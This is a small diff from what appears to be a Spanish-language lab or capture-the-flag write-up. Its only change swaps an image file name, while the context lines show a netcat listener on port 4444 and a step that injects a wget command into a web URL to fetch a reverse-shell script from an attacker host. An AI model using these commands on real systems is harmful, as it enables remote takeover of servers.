@@ -144,7 +144,7 @@ sudo nc -nvlp 4444
 ```
 
 
-![Nmap Scan](images/talent/17.png)
+![Nmap Scan](images/talent/16.png)
 
 
 5- en la página web en la URL ejevutamos el siguiente comando: `wget+http://172.17.0.1/reverse.sh` quedando la URL así:
